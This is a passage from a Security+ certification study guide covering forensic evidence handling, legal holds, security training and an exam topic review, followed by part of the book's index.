Video surveillance methods such as closed-circuit television (CCTV) systems are often used as a detective control during an investigation. If a person is recorded on video, the video provides reliable proof of the person’s location and activity. example, if a person is stealing equipment or data, video might provide proof.
example, I remember a high school student was working nights at a local grocery store. The store had a delivery of beer in a tractor-trailer that hadn’t been unloaded yet but was kept backed up to the store loading dock overnight. The student stole several cases of beer thinking the crime was undetectable. However, the entire scene was recorded on video. When he showed up for work the next evening, the store promptly called the police and provided a copy of the video. The video provided reliable proof that simply couldn’t be disputed.
Record Time Offset
In some cases, it’s easy to identify the time of an event such as in Figure 11.1. In the figure, you can easily identify the exact dates and times when someone created, modified, last saved, and last accessed the file. However, in some cases, you need to consider a time offset.
Figure 11.1: File Explorer showing exact dates and times
example, Greenwich Mean Time (GMT) identifies the time at the Royal Observatory in Greenwich, London. Other times are often expressed as a relationship to GMT. example, I live in the Eastern Standard Time (EST) zone, which has a four-hour offset. You can express the Date Accessed time as 5:10 p.m. EST. Using GMT, you can express the same time as 9:10
p.m. GMT. One benefit of using GMT is that it doesn’t change for daylight saving time, so it stays constant.
Many video recorders use a record time offset to identify times on tape recordings rather
than the actual time. example, a recording might use a displayed counter to identify the time that has passed since the recording started. Imagine that the counter advances 1,000 ticks or counts per hour. If the counter indicates an event occurred at an offset time of 1,500 and the recording started at midnight, then the time of the event was 1:30 a.m.
When analyzing timestamps of any evidence, it’s important to understand that these times are often based on an offset. If you can’t identify the offset, you might not be able to identify the actual time.
Screenshots
Screenshots are simply pictures of what you can see displayed on a computer screen. If you want to capture exactly what a user was doing, or specific displays, a screenshot is the perfect solution. example, Figure 11.1, shown previously, is a screenshot of File Explorer. Yo u can save screenshots as graphics files and embed these graphics into documents. Many operating systems include the ability to capture the screen and save it to the Clipboard. example, you can capture the screen of almost any system by pressing the PrtScn key found on most keyboards. Many applications such as the Windows Snipping Tool or Snagit by TechSmith allow you to capture screenshots from specific windows or applications, any region of the screen, and even scrolling windows such as a long web page.
Witness Interviews
Another element of an investigation is interviewing witnesses. Witnesses provide firsthand reports of what happened and when it happened. However, witnesses won’t necessarily come forward with relevant information unless someone asks them. Often witnesses don’t recognize what information is valuable.
example, imagine a tailgating incident where an attacker follows closely behind an employee. The employee uses a proximity card to get in, but the attacker just walks right in behind the employee. The employee might notice, but not give it much thought, especially if tailgating is common in the organization. If the attack resulted in loss of equipment or data, an investigator might get a good description of the attacker just by interviewing witnesses.
Chain of Custody
A key part of incident response is collecting and protecting evidence. A chain of custody is a process that provides assurances that evidence has been controlled and handled properly after collection. Forensic experts establish a chain of custody when they first collect evidence. Security professionals use a chain of custody form to document this control. The chain of custody form provides a record of every person who was in possession of a physical asset collected as evidence. It shows who had custody of the evidence and where it was stored the entire time since collection. Additionally, personnel often tag the evidence as part of a chain of custody process. A proper chain of custody process ensures that evidence presented in a court of law is the same evidence that security professionals collected.
example, imagine that Homer collected a hard drive as part of an investigation. However, instead of establishing a chain of custody, he simply stores the drive on his desk with the intention of analyzing it the next day. Is it possible that someone could modify the contents of the drive overnight? Absolutely. Instead, he should immediately establish a chain of custody and lock the drive in a secure storage location.
If evidence is not controlled, someone can modify, tamper, or corrupt it. Courts will rule the evidence inadmissible if there is a lack of adequate control, or even a lack of documentation showing that personnel maintained adequate control. However, the chain of custody provides proof that personnel handled the evidence properly.
Legal Hold
A legal hold refers to a court order to maintain different types of data as evidence. example, imagine that Ziffcorp is being sued for fraud and is being investigated by the Securities and Exchange Commission. A court orders them to maintain digital and paper documents for the past three years related to the case. Ziffcorp now needs to take steps to preserve the data. This data may include emails; databases; backup tapes; data stored on servers in file shares and document libraries; and data stored on desktop computers, laptops, tablets, and smartphones owned by the company. The first step management needs to take is to direct the data custodians to preserve this data. On the surface, this might sound easy, but it can be tremendously complex, especially if it is not clear to data custodians what data should be maintained. They might preserve too much data, resulting in a significant cost to store it. They might preserve too little data, subjecting the company to more litigation in a suspected cover-up.
Data retention policies also apply here. example, imagine that the data retention policy states that email older than six months is deleted. If administrators rigorously followed the policy, the company wouldn’t have any emails from more than six months ago. That’s OK if the policy is in writing and administrators are following it.
What if the administrators didn’t follow the data retention policy? What if they have email from as long as two years ago? In this scenario, administrators need to maintain these emails. If they take steps to delete the emails after receiving the court order, it looks like they are trying to withhold evidence and puts the organization into legal jeopardy for a cover-up.
Recovery of Data
Generically, data recovery refers to restoring lost data, such as restoring a corrupt file from a backup. In the context of forensics, data recovery goes further. Even without backups, it’s often possible to recover data that has been intentionally or accidentally deleted.
When a user deletes a file, the operating system typically just marks it for deletion and makes the space the file is consuming available to use for other files. However, the file is still there. Many file systems place the file in a recycle bin or trash can and you can just retrieve it from there. Even if the user empties the trash after deleting a file, forensic experts can use tools to undelete the files.
Formatting a drive appears as though it has overwritten all the data on the drive. However, just as forensic experts have tools to undelete files, they also have tools they can use to unformat drives. It’s worth noting that criminals have access to these same tools, too, and can recover data from systems that haven’t been sanitized.
Active Logging for Intelligence Gathering
I t ’s often appropriate for organizations to engage in strategic intelligence or counterintelligence gathering by increasing the amount of data that they collect. example, an active logging strategy can help an organization gather a significant amount of data on attackers.
Typically, a network infrastructure is configured to log only the data needed for daily operations. If the network is under attack, administrators might increase the logging capabilities at some point while the attack is happening. However, they might not have valuable data if they had those same logging capabilities enabled when the attack began.
An active logging strategy increases the amount of logged data collected on a routine basis. Ideally, network administrators will have filters available so that they can view only the data they need for daily operations. However, if an attack begins, security professionals can view all the logged data. Track Man-Hours and Expense
Investigations can take an extraordinary amount of time and, for any business, time is money. When budget time rolls around, the departments that can accurately identify how much time and money they spent are more likely to get their requested budget approved.
Additionally, quantitative risk assessments base decisions on using specific monetary amounts, such as cost and asset values. If an incident required involvement by security professionals on an incident response team, the man-hours and expenses incurred by the incident response team need to be included in the assessment. Including this data improves the accuracy of the cost values used in the quantitative risk assessment.
Providing Training
Organizations commonly provide training to users on a variety of issues. This includes training personnel on security policies and continuing education training to help ensure personnel remain up to date with current technologies.
Role-Based Awareness Training
Role-based awareness training is targeted to personnel based on their roles. The primary goal is to minimize the risk to the organization, and by giving users the training they need, they are better prepared to avoid threats. The following roles often require role-based training:
Data owner. Data owners need to understand their responsibilities related to data that they own. This includes ensuring that the data is classified correctly and ensuring that the data is labeled to match the classification. They are also responsible for ensuring adequate security controls are implemented to protect the data. While they often delegate day-to-day tasks to data custodians, they cannot delegate their responsibility.
System administrator. System administrators are responsible for the overall security of a system. They often need technical training so that they understand the software capabilities and vulnerabilities, and how to ensure the system is operating in a secure state. As a simple example, if an organization purchases a new hardware firewall, system administrators need training to ensure they know how to implement it securely.
System owner. A system owner is typically a high-level executive or department head who has overall responsibility for the system. While system owners won’t perform
daily maintenance on their systems, they are responsible for ensuring that system administrators have the skills and knowledge to maintain them.
User. Regular end users need to understand common threats, such as malware and phishing attacks. They also need to understand the risk posed by clicking an unknown link and how drive- by downloads can infect their system. Training can include a wide variety of topics depending on the organization and can be delivered via different methods. example, security experts can send emails informing users of current threats. Some training is delivered via web sites, in a classroom, or informally by supervisors. Training is often included when users review and sign an organization’s AUP.
Privileged user. A privileged user is any user with more rights and permissions than typical end users. Privileged users need training on the classification and labeling of data that they handle. Administrators are often required to use two accounts, one for regular use and one for administrative use. For administrators to follow this policy, they need to understand why it’s implemented and the potential repercussions if the administrator always uses the administrator account.
Executive user. Executives need high-level briefings related to the risks that the organization faces, along with information on the organization’s overall information security awareness program. Additionally, executives should be trained on whaling attacks because attackers target executives with malicious phishing emails.
Incident response team. An incident response team needs detailed training on how to respond to incidents. Even within the team, personnel might require different training. example, security personnel responsible for forensic investigations need specialized forensic training.
The success of any security awareness and training plan is directly related to the support from senior management. If senior management supports the plan, middle management and employees will also support it. On the other hand, if senior management does not show support for the plan, it’s very likely that personnel within the organization will not support it either.
Continuing Education
Training is rarely a once and done event. Instead, personnel need to regularly receive additional training to ensure they are up to date on current threats, vulnerabilities, and technologies. If network administrators are still using the same practices and technologies they learned 10 years ago, their networks are very likely vulnerable to a multitude of attacks.
This concept is used in many different professions. example, your doctor is required to regularly attend continuing education to update her knowledge. That’s a good thing. When you’re receiving medical treatment and advice, you don’t want treatment and advice that was valid a decade ago, but might not be valid today. Similarly, many certifications (including the CompTIA Security+ certification) have formal continuing education requirements.
Continuing education within an organization can take many forms. It’s often possible to send personnel to classes to update their knowledge. When many people need the same training, an organization will often bring in a trainer to teach a class in-house.
Training and Compliance Issues
There are many situations where training is required to maintain compliance with existing laws, best practices, and standards. example, many laws exist covering PII. Although these laws have many similarities, there can be minor differences in different localities. It’s important for personnel handling any PII to understand the laws that apply.
Best practices often prevent a wide range of incidents when users understand and follow them. This book has covered many best practices, including developing and following a security policy, ensuring users do not share accounts, using strong passwords, following the principle of least privilege, and much more. Unless personnel know about them, and understand them, they might not be implementing them.
Additionally, many organizations should abide by certain standards. example, organizations handling credit card information need to comply with the Payment Card Industry Data Security Standard (PCI DSS). PCI DSS includes six control objectives and 12 specific requirements that help prevent fraud.
Administrators might understand how to implement many of these without any additional training. However, some of the requirements might require additional training to maintain compliance. PCI DSS isn’t foolproof, but it has helped reduce many of the risks associated with credit card fraud.
Troubleshooting Personnel Issues
One of the objectives for the CompTIA exam is to troubleshoot common security issues, including personnel issues. While I’ve covered these topics in different chapters, I am summarizing them here. The personnel issues are insider threat, personal email, policy violation, social engineering, and social media.
The way to detect an insider threat depends on the activity. Imagine
Bart is trying to copy proprietary data onto an external drive or send proprietary data outside the network via email. Data loss prevention (DLP) techniques provide the best method to detect these activities. DLP systems typically send notifications to security personnel, who can then take steps to stop Bart. Audits and reviews can often detect insider threats, too. example, usage auditing will detect what users are doing. This includes showing what files and folders they’re accessing, and how they are using their rights and permissions. If they’re doing things outside their job role, it
should be investigated.
Two of these issues (personal email and social media) refer to users not following the security policy. example, a policy might say that users can’t use email for personal purposes and can’t associate themselves with the organization when posting to social media. These activities are often detected by other employees and reported to management. A training program reminding users of the policies can minimize these incidents.
When policy violations are detected, management acts based on the
organization’s policies.
This can include anything from verbal counseling to termination.
The best way to detect social engineering tactics is to educate personnel on
common tactics.
When they detect a social engineer, employees should report them. Security personnel can take additional steps to raise the awareness of these incidents through training and awareness programs.
Chapter 11 Exam Topic Review
When preparing for the exam, make sure you understand these key concepts covered in this chapter.
Exploring Security Policies
Written security policies are administrative controls that identify an overall security plan for an organization and help to reduce overall risk. Plans and procedures identify security controls used to enforce security policies.
An acceptable use policy defines proper system usage for users and spells out rules of behavior when accessing systems and networks. It often provides specific examples of unacceptable usage, such as visiting certain web sites, and typically includes statements informing users that the organization monitors user activities. Users are required to read and sign an acceptable use policy when hired, and in conjunction with refresher training.
Mandatory vacation policies require employees to take time away from their job. These policies help to reduce fraud and discover malicious activities by employees.
A separation of duties policy separates individual tasks of an overall function between different entities or different people, and helps deter fraud. example, a single person shouldn’t be able to approve bills and pay them, or print checks and then sign them.
Job rotation policies require employees to change roles on a regular basis. Employees might swap roles temporarily, such as for three to four weeks, or permanently. These policies help to prevent employees from continuing with fraudulent activities, and help detect fraud if it occurs. Clean desk policies require users to organize their desks and surrounding areas to reduce the risk of possible data theft and
password compromise.
Background checks are performed before hiring an employee. Once hired, onboarding processes give employees access to resources. An exit interview is conducted before an employee departs the organization, and the account is typically disabled during the interview.
Improper use of social networking sites can result in inadvertent information disclosure. Attackers gather information from these sites to launch attacks against users, such as cognitive password attacks to change users’ passwords. Training reduces these risks.
A non-disclosure agreement helps ensure that proprietary data is not shared.
A service level agreement (SLA) is an agreement between a company and a vendor that stipulates performance expectations, such as minimum uptime and maximum downtime levels. An interconnection security agreement (ISA) specifies technical and security requirements for connections and ensures data confidentiality while data is in transit.
A memorandum of understanding or memorandum of agreement (MOU/MOA) supports an ISA, but doesn’t include technical details.
Protecting Data
Information classification practices help protect sensitive data by ensuring users understand the value of data. Data labeling ensures that users know what data they are handling and processing. Public data is available to anyone. Confidential data is information that an organization intends to keep secret among a certain group of people. Proprietary data is data that is related to ownership, such as patents or trade secrets. Private data includes PII and PHI.
Destruction and sanitization methods ensure that sensitive data is removed from decommissioned systems. File shredders remove all remnants of a file. Wiping methods erase disk drives. Degaussing a disk magnetically erases all the data. Physically destroying a drive is the most secure method of ensuring unauthorized personnel cannot access proprietary information. Retention policies identify how long data is retained. They can limit a company’s exposure to legal proceedings and reduce the amount of labor required to respond to court orders.
Personally Identifiable Information (PII) is used to personally identify an individual. Examples include the full name, birth date, address, and medical information of a person. Personal Health Information (PHI) is PII that includes medical or health-related information.
PII/PHI requires special handling for data retention. Many laws mandate the protection of both, and require informing individuals when an attack results in the compromise of PII or PHI.
A data owner has overall responsibility for data. A steward or custodian handles routine tasks to protect data. A privacy officer is responsible for ensuring an organization complies with relevant laws to protect privacy data, such as PII or PHI.
Responding to Incidents
An incident response policy defines an incident and response procedures. Organizations review and update incidents periodically and after reviewing lessons learned after actual incidents.
The first step in incident response is preparation. It includes creating and maintaining an incident response policy and includes prevention steps such as implementing security controls to prevent malware infections.
Before acting, personnel verify an event is an actual incident. Next, they attempt to contain or isolate the problem. Disconnecting a computer from a network will isolate it.
Eradication attempts to remove all malicious components left after an incident. Recovery restores a system to its original state. Depending on the scope of the incident, administrators might completely rebuild the system, including applying all updates and patches.
A review of lessons learned helps an organization prevent a recurrence of an incident. The order of volatility for data from most volatile to least volatile is cache memory, regular RAM, a paging file, hard drive data, logs stored on remote systems, and archived media. Forensic experts capture an image of the data before analysis to preserve the original and maintain its usability as evidence.
Hard drive imaging creates a forensic copy and prevents the forensic capture and analysis from modifying the original evidence. A forensic image is a bit-by-bit copy of the data and does not modify the data during the capture.
Hashing provides integrity for images, including images of both memory and disk drives. Taking a hash before and after capturing a disk image verifies that the capturing process did not modify data. Hashes can reveal evidence tampering or, at the very least, that evidence has lost integrity. A chain of custody provides assurances that personnel controlled and handled evidence properly after collecting it. It may start with a tag attached to the physical item, followed by a chain of custody form that documents everyone who handled it and when they handled it.
A legal hold requires an organization to protect existing data as evidence.
Providing Training
Security awareness and training programs reinforce user compliance with security policies and help reduce risks posed by users.
Role-based training ensures that personnel receive the training they need. example, executives need training on whaling attacks.
Common roles that require role-based training are data owners, system administrators, system owners, end users, privileged users, and executive users.
Continuing education programs ensure that personnel are kept up to date on current technologies, threats, and vulnerabilities.
Online References
Do you know how to answer performance-based questions? Check out the online extras at http:// gcgapremium.com/501-extras.
Index
Numbers
3DES, 438
A
AAA protocols, 216
ABAC (access control model), 129-130 accept (risk response), 347 acceptable use policy/rules of behavior, 475 access control models, 122-130
ABAC, 129-130
DAC, 126-127
MAC, 127-129
role-based access control, 122-125 rule-based access control, 126 access point, 192
antenna types and placement, 196 band selection/width, 193 controller-based versus standalone, 193 fat versus thin, 193 MAC filtering, 195-196
signal strength, 197
SSID, 194-195
access violations, 255-257
account management (general concepts) account maintenance, 121 group-based access control, 124 least privilege, 116
location-based policies, 120
permission auditing and review, 372-373 recertification, 121 standard naming convention, 118 time-of-day restrictions, 120
usage auditing and review, 371-372 account policy enforcement credential management, 121-122 disablement, 119
expiration, 121
Group Policy, 100-102
lockout, 102
password complexity, 97-99, 102
password expiration, 99
password history, 101-102 password length, 102 password reuse, 101 recovery, 119
account types, 117
guest accounts, 117
privileged accounts, 117
service accounts, 117
shared and generic accounts/credentials, 118 user account, 117-118 ACL, 157-158
 antispoofing, 158
firewalls, 161, 162
IDS, 187
implicit deny, 158
IPsec, 157-158
ports, 141, 153
router, 157-158
rule-based access control, 126 segmentation, 166 use case, 172
active-active (failover cluster, load balancing), 398-399 active-passive (failover cluster, load balancing), 398-399 active logging (strategic intelligence gathering), 500
active reconnaissance, 360 ad hoc mobile device, 250
zone, topology, 198 administrative (security control), 70-71 advanced malware tools, 290 adverse actions (policies), 480 adware, 276
AES, 63, 199, 433, 436, 437-438
affinity (load balancing, scheduler), 400 agent versus agentless (NAC), 212-213 aggregation SIEM, 370
switch, 160
agile (software development life-cycle model), 325 agreement types, 483-484 BPA, 484
ISA, 484
MOU/MOA, 484
SLA, 484
AH, 143, 153, 209
airgap (physical security, segmentation), 166 alarms (physical security), 388 ALE (risk assessment), 348 always-on VPN, 211
amplification, 309
ANT (mobile device connection), 245
antenna types and placement (wireless access point), 196 anti-malware, 287-289
antispoofing, 158, 172
antivirus, 288
application-based versus network-based (firewall), 161 application/multipurpose (proxy), 169-170
application attacks, 327-333 application blacklist, blacklisting, 233 application cells/containers (hypervisor), 76-77 application management (MDM), 245 application whitelist, whitelisting, 233, 245 APT (threat actor), 269
architecture and design weaknesses (vulnerability), 391 ARO (risk assessment), 348 ARP (protocol), 88, 141-142
ARP poisoning, 141-142, 306-307
asset management, 391
asset value, (risk assessment), 347 asymmetric algorithms. 439-445 Diffie-Hellman, 444 DHE, 444 ECDHE,444 groups, 444
DSA, 446
elliptic curve, 443-444 PGP/GPG, 450
RSA, 443
asymmetric encryption, 424, 432, 439-440
certificates, 441-442
confidentiality with encryption, 432-433 encrypting email, 448-450 HTTPS and TLS, 189, 450-451
introduction, 424-425
public and private keys, 445-446 RSA, 443 static versus ephemeral keys, 443 TPM, 238 attestation (secure boot), 237 attributes of threat actors, 268-270 authentication, authorization and accounting (AAA), 96-97
AAA protocols, 216
RADIUS server, 200
authentication issues (troubleshooting), 109- 110
authentication protocols (wireless) 201-202 EAP, 201
EAP-FAST, 201
EAP-TLS, 201
EAP-TTLS, 201
IEEE 802.1x, 199-201
PEAP, 201
RADIUS Federation, 201
automated alerting and triggers (SIEM), 370 automation/scripting, 230 automated courses of action, 230, 370
configuration validation, 359
continuous monitoring, 370, 371 avoid (risk response), 346
B
backdoor, 272
background checks (policies), 479 backup concepts, 400-403 differential, 402
full, 401-402
incremental, 402-403
snapshots, 403
backup utilities, 401
band selection/width (wireless access point), 193 banner grabbing, 356
netcat, 367
barricades (physical security), 389 baseline deviation, 231
baselining (Secure DevOps), 325-326 BCRYPT, 428 benchmarks/secure configuration guides, 334 general purpose guides, 334 platform/vendor- specific guides, 334
application server, 334
network infrastructure devices, 334 operating system, 334 web server, 334
biometric factors, 106-107 crossover error rate, 107 facial recognition, 106
false acceptance rate, 106-107 false rejection rate, 107 fingerprint scanner, 106
iris scanner, 106
retinal scanner, 107
voice recognition, 106 biometrics mobile devices, 246
physical security, 385-386
BIOS (hardware/firmware security), 237 birthday attack, 311-312 black box, 362
blacklist, blacklisting, 233
Blowfish, 438-439
bluejacking, 205
bluesnarfing, 206 Bluetooth
attacks, 206, 207
mobile device connection, 245 bollards (physical security), 389 bots, 276
BPA (agreement type), 484 bridge, 159 brute force attack, 311
buffer overflow, 317, 320, 327
burning (destruction and sanitization), 486 BYOD (mobile device deployment model), 243- 244
C
CA, 454-456
cable locks (physical security), 390 CAC, 103-104
cage (physical security Faraday cage), 395
cameras
comparing detection and prevention controls, 74 embedded system, 236, 251, 253, 277
mobile device, 235, 236, 243, 249
physical security, 385, 387
shoulder surfing, 279
captive portals, 202
capture system image (forensics), 495 capture video (forensics), 497 carrier unlocking (mobile device), 250 CBC (cipher mode), 435 CCMP, 199, 201, 202, 206, 207
cellular (mobile device connection), 244 CER (certificate format), 461- 462 certificate, 441-442 asymmetric encryption, 439-440
certificate authority, 454
certificate chaining, 455
certificate formats, 461-463
certificate issues, 458-459
certificate types, 460-461
CRL, 459
CSR, 456
digital signature, 66-67
DNSSEC, 148 email, 446-450
HTTPS transport encryption, 450-452 OCSP, 459
Pinning, 459
PKI components, 454-461?
registration, 456
revoking certificates, 457 smart cards, CAC, PIV, 103-104 stapling, 459
certificate and key management, 458 certificate chaining (PKI concept), 455-456 certificate formats, 461-463
CER (certificate format), 461-462 DER (certificate format), 461- 462 P12 (certificate format), 462-463 P7B (certificate format), 462 PEM (certificate format), 462 PFX (certificate format), 462-
463
certificate issues, 458-459 certificate types, 460-461
code signing (digital signature), 460 domain validation, 461 email, 460 extended validation, 461
machine/computer, 460
root, 455-456
SAN, 461
self-signed, 461
user, 460
wildcard, 461
certificate-based authentication, 103
CAC, 103-104
IEEE 802.1x, 191
PIV, 103-104
smart cards 103 chain of custody, 498-499 change management
security control, 71, 73
policy, 232
version control and, 326
CHAP (identity and access services), 214 chmod, 257 chroot, 234
cipher modes, 434, 435
CBC, 435
CTM, 435
ECB, 435
GCM, 435
stream versus block, 434 cipher suites, 435, 452-453 clean desk (policies), 477 clickjacking, 314 cloud access security broker, 242 cloud deployment models, 239-242 community, 242
hybrid, 242
IaaS, 240-241 PaaS, 240 private, 242 public, 242
SaaS, 240
cloud storage, 239
code obfuscation (camouflage), 323 code quality and testing, 324 code reuse (and dead code), 323 code signing
certificate type, 460
secure coding, 322-323
cold site, 410
collision, 312, 313
command line tools, 80-88, 366-367 arp, 88
chmod, 257
chroot, 234
ipconfig/ip/ifconfig, 84-85
netcat, 367
netstat, 86
nmap, 366-367 nslookup/dig ping, 82-84
tcpdump, 366
tracert, 87-88
common misconfigurations, 357 community (cloud model), 242 compensating (security control), 74-75 competitors (threat actor), 269 compiled versus runtime code, 319 configuration compliance scanner, 359 confusion, 433, 434
connection methods (mobile devices), 244-245 ANT, 245 Bluetooth, 245
cellular, 244
infrared, 245
NFC, 245
SATCOM, 244
USB, 245
Wi-Fi, 244
containerization (MDM), 246 content management (MDM), 246
context-aware authentication(MDM), 247 continuing education (policies), 501-502 continuity of operation planning, 409
after-action reports, 412 alternate business practices, 406 alternate processing sites, 406, 409-410,
413
exercises/tabletop, 412
failover, 398-399, 413
continuous integration (Secure DevOps), 325 control diversity (defense-in- depth), 382-383 controller-based versus standalone (wireless access point), 193
COPE (mobile device deployment model), 243 corporate-owned (mobile device deployment model), 243
corrective (security control), 74 correlation (SIEM), 370 correlation engine (location), 371 credential management, 121-122
credentialed versus noncredentialed, 358 critical systems identification (BIA), 406 CRL, 457-459
cross-site request forgery, 333 cross-site scripting, 332 crossover error rate (biometric factor), 107 crypto modules, 453 crypto service provider, 453 crypto-malware, 274
cryptographic attacks (password attacks) 309- 313 cryptographic protocols (wireless) CCMP, 199 TKIP, 199
WPA, 198
WPA2, 198
CSR, 456-457
CTM (cipher mode), 435
custom firmware (mobile device), 248
CYOD (mobile device deployment model), 244
D
DAC (access control model), 126-127 data-at-rest, 142, 254, 432-433
data-in-transit, 142, 143, 172, 189, 205, 254, 432-
433, 450
data-in-use, 432
data acquisition (forensics) 495-498 capture system image, 495 capture video, 497
network traffic and logs, 496 record time offset, 497-498 screenshots, 498
take hashes, 496
witness interviews, 498
data destruction and media sanitization, 486- 487
burning, 486
degaussing, 487
pulping, 487
pulverizing, 487
purging, 487
shredding, 487
wiping, 486
data execution prevention, 289-290 data exfiltration, 258 data exposure (preventing, secure coding techniques), 322
data retention, 487-488
data roles (responsibilities), 490 owner, 490
privacy officer, 490
steward/custodian, 490 data sanitization tools, 486-487 data sensitivity labeling and handling, 485 confidential, 485 PHI, 485, 488-489 PII, 485, 488-489
private, 485
proprietary, 485
public, 485
database security, 255
DDoS, 140, 270, 276, 304
default configuration (vulnerability), 226-227 defense-in-depth/layered security, 382-383 control diversity, 382-383
administrative, 383
technical, 382
host-based firewall, 160
malware, 287-288
preventive control, 72
unified threat management, 170 user training, 383 vendor diversity, 383
degaussing (destruction and sanitization), 487 deployment models (mobile devices), 243-244 BYOD, 243-244
COPE, 243 Corporate-owned, 243
CYOD, 244
VDI, 244
DER (certificate format), 461-462 DES, 438
detection versus prevention controls (security control), 74 detective (security control),73 deterrent (security control), 74
development life-cycle models, 324-325 waterfall versus agile, 324-325 Diameter, 216 dictionary attack, 310
differential (backups), 402 Diffie-Hellman, 433, 444 DHE, 444 ECDHE,444 Groups, 444
diffusion, 433, 434
dig (command), 149 digital cameras botnets, 276-277 mobile devices, 243
secure systems design, 235, 236
USB OTG, 249
digital signatures, 66-67, 103-104, 425, 427,
445-448
code signing, 322
DNSSEC, 148
OCSP, 459
prevent spear phishing, 284 Rayburn box, 441 S/MIME, 450 signing email, 446-448
smart cards, CAC, PIV, 103-104 directory services use case, 145 disablement (account management policy), 73, 89, 119, 121
disassociation attack, 202
disaster recovery, 411-412
disk redundancies, 396-397 dissolvable agent (NAC), 212-213 distributive allocation (high availability, scalability), 398
DLL injection, 319
DLP, 257-258, 357
cloud-based, 258-259
data exfiltration, 258
mail gateway (email), 171 removable media, 257-258
USB blocking, 257-258
DMZ (zone, topology), 163-165 DNS poisoning 148-149, 308
DNSSEC, 148, 308
domain hijacking, 315
domain name resolution use case, 147-149 domain validation (certificate), 461 DoS, 140, 304, 185, 204, 207, 270, 304
downgrade attack, 453-454
driver manipulation, 315-316
DSA, 446
dumpster diving, 280
dynamic analysis (such as fuzzing), 324 E
EAP, 201
EAP-FAST, 201
EAP-TLS, 201
EAP-TTLS, 201
ECB (cipher mode), 435 elasticity, 75
elliptic curve, 443-444
email (certificate), 460
email and web use case, 144-145 embedded systems, 250-254 vulnerabilities, 251
EMI (hardware/firmware security), 236 EMP (hardware/firmware security), 236 encryption asymmetric algorithms, 435-439
confidentiality, 63, 254, 432 full device encryption, 245-246 mail
gateway, 172
secure coding techniques, 332-333 symmetric algorithms, 439-435 end-of-life systems (vulnerabilities), 239 enforcement and monitoring for (mobile
devices), 247-250
ad hoc, 250
camera use, 249
carrier unlocking, 250
custom firmware, 248 external media, 249 firmware OTA updates, 248 GPS tagging, 247 jailbreaking, 248
MMS, 249
payment methods, 249 recording microphone, 249 rooting, 248
sideloading, 248
SMS, 249
tethering, 250
third-party app stores, 248 USB OTG, 249 Wi-Fi direct, 250
Enterprise (wireless security method), 199-201 environment (secure staging & deployment), 235
development, 235
production, 235
staging, 235
test, 235
environmental controls (physical security), 391- 393
fire suppression (physical security), 393 hot and cold aisles (physical security), 392 HVAC (physical security), 391-393
ephemeral key, 443, 444
errata, 5
error-handling, 318, 320 322, 330, 331 escalation of privilege (penetration
testing), 361 ESP, 143, 153, 209
event deduplication (SIEM), 371 evil twin, 204 exit interviews (policies), 479-480
expiration (account management policy), 121 exploitation frameworks, 365 extended validation (certificate), 461 external media (mobile device), 249 external storage devices (secure systems design), 235-236 extranet (zone, topology), 163-165
F
facial recognition (biometric factor), 106 failover clusters, 67, 395, 397-
400, 413
false acceptance rate (biometric factor), 106-107 false negative
NIPS/NIDS, 186-187
false positive
NIPS/NIDS, 186-187 vulnerability scanning, 358
false rejection rate (biometric factor), 107 Faraday cage (physical security), 395 fat versus thin (wireless access point), 193 fault tolerance, 67, 395, 396
disk redundancies, 396-397
power redundancies, 400 server redundancy, 397
FDE (hardware/firmware security), 237 federation, 114-115, 201
fencing/gate, 388
file integrity check, 289
file system security (identity and access management), 255-257 file transfer use case, 142-143 fingerprint scanner (biometric factor), 106 fire suppression (physical security), 393 firewall, 160-163
ACL, 126, 153, 157-158, 160, 162
antispoofing, 158
application-based versus network-based, 161 blocking ping, 84
control diversity, 382
defense-in-depth, 382-383
DMZ, 163-165
host-based firewalls, 160-161
ICMP, 141
implicit deny, 158
IPsec, 209
lack of firewall (vulnerability), 346 logs, 368
network access control, 211-212 NIDS (sensors), 183-184 ports, 150, 153
rule-based access control, 126 separation and segmentation (logical),
166
stateful versus stateless, 141, 162 stateless firewall rules, 162
technical control, 70
unified threat management (UTM), 170- 171
vendor diversity, 383
web application firewall, 163 firmware OTA updates (mobile device), 248 forensics (basic concepts), 493-500
forward proxy, 167-168 frameworks exploitation frameworks, 365 industry-specific frameworks, 334 industry-standard frameworks and reference architectures, 334 national versus international frameworks, 334 non-regulatory, 334
regulatory, 334
FTPS, 143
full (backups), 401-402
full device encryption (MDM), 245-246 fuzzing, 324
G
GCM (cipher mode), 435
general security policies, 481-483 personal email, 481 social media networks/applications, 481- 482
geofencing (MDM), 247 geographic considerations (backups, disaster recovery), 404-405 data sovereignty, 405 distance, 405
legal implications, 405
location selection, 405
off-site backups, 405
geolocation (MDM), 247
GPS tagging (mobile device), 247 gray box, 362
group-based access control, 124 Group Policy, 100-103 account lockout policy, 102 application whitelisting and blacklisting, 233
baseline and integrity measurements, 231 directory services, 145 NTLM/NTLMv2 (pass the hash), 311 password policy, 101-102, resiliency and automation, 230
guest (zone, topology), 198 guest account, 117
H
hacktivist (threat actor), 268 hardware/firmware security (secure systems design), 236
BIOS, 237
EMI, 236
EMP, 236
FDE, 237
hardware root of trust, 238 HSM, 238 secure boot and attestation, 237 SED, 237 supply chain, 236
TPM, 237-238
UEFI, 237
hardware root of trust (hardware/firmware security), 238 hardware security module, 238 hashing, 64-66, 105, 111, 311-313, 424, 425-432
hashing algorithms, 425-432
HMAC, 426-427, 430-432
MD5, 425-426
RIPEMD, 427
SHA, 426
HIDS, 182-183
high availability, 397-398
failover clusters, 398
load balancers, 399-400 hijacking and related attacks, 314-315 HIPS, 187
HMAC, 64-66, 111, 426-427, 430-432
hoax, 279-280
home automation (embedded systems), 252 honeynets (zone, topology), 190 Honeypot, 187, 190, 191
host-based firewalls, 160-161
host health checks (NAC), 211-212
hot and cold aisles (physical security), 392 hot site, 409-410 HOTP/TOTP, 104-105
how to use this book, 2-3
HSM (hardware/firmware security), 238 HTTPS, 450-452
data-in-transit, 432
secure protocol, 143, 145, 149 transport encryption, 450-452
HVAC
embedded system, 252 physical security, 391-393, 394
documented incident types/category definitions, 491 exercise, 492
hybrid (cloud model), 242 hypervisor, 75-77 application cells/containers, 76-77
Type I, 76
Type II, 76
I
IaaS, 240-241
ICMP, 141, 157, 162
amplification attack, 309
ping command, 83, 84,
ping scan, 353
protocol numbers, 141, 153
ICS, 252
identification, 96-97, 106, 109, 115 identifying lack of security controls, 358 identifying vulnerabilities and
misconfigurations, 356-357 IDS/IPS, 182-187 IEEE 802.1x
authentication (certificate-based), 191 authentication (RADIUS and VPN), 214-
215
wireless (RADIUS), 200-201 wireless authentication (Enterprise
mode), 199-201
immutable systems (Secure DevOps), 326 impact (BIA) 407 finance, 407
life 407
property, 407
reputation, 407
safety, 407
